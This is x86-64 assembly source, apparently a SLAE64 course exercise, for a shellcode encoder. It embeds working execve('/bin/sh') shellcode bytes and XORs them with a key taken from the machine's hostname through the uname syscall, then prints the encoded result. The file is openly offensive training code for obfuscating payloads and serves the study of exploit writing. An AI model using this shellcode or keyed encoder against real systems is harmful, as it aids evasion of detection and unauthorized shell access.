; author     : Sandro "guly" Zaccarini SLAE64-1497
; purpose    : this program will encode a given shellcode
; license    : CC-BY-NC-SA
;
; takes a shellcode, and xor it using sys_uname

  global _start
  section .text
  ; execve('/bin/bash') as easy proof
  SC: db 0x48,0x31,0xc0,0x50,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x53,0x48,0x89,0xe7,0x50,0x48,0x89,0xe2,0x57,0x48,0x89,0xe6,0x48,0x83,0xc0,0x3b,0x0f,0x05
  mlen equ $-SC

; very useful both to debug and to have the encoded shellcode printed out
  writeexit:
; don't care about previous env, junk it and print my 0x20 chars
pop rax
xor rax,rax
xor rdi,rdi
inc rdi      ; print to STDOUT of course
mov rsi,rsp
mov al,0x1   ; write syscall id
mov rdx,rax
mov dl,mlen  ; SC len here
syscall
xor rax,rax
mov rdi,rax
mov al,0x3C  ; and a neat exit, because when i print i don't want to exec
syscall

  _start:
; get hostname
xor rax,rax
mov al,0x3f
mov rdi,rsp
syscall

; xor everything to be sure, i don't need this to be small
xor r13,r13
xor r12,r12
xor r11,r11
add r13,mlen
add r13,0x8
add r13,0x41
; make enough room on the stack
sub rsp,mlen
sub rsp,0x8
lea r15,[rel SC]

; counter to copy
xor rcx,rcx
xor r14,r14
xor rbx,rbx

mov cl,mlen
dec cx

; r12 act as counter, will hold $hostname length and is resetted when $hostname byte is 0
; r13 will hold offset
; r14b will have original byte, then xored

  copy:
mov byte r14b,[r15+rcx]
inc r12
mov r11b,[rsp+r13]
inc r13
; i don't want 0x00, so inc/dec to have eventually a ZERO flag set
inc r11
dec r11
jnz noreset
  reset:
sub r13,r12
xor r12,r12
mov r11b,[rsp+r13]
inc r12
inc r13
  noreset:
xor r14b,r11b
mov byte [rsp+rcx],r14b
loop copy

; last(first?) byte
mov byte r14b,[r15]
mov r11b,[rsp+r13]
inc r11
dec r11
jnz noreset2
  reset2:
sub r13,r12
xor r12,r12
mov r11b,[rsp+r13]
inc r12
inc r13
  noreset2:
xor r14b,r11b
mov byte [rsp],r14b

call writeexit
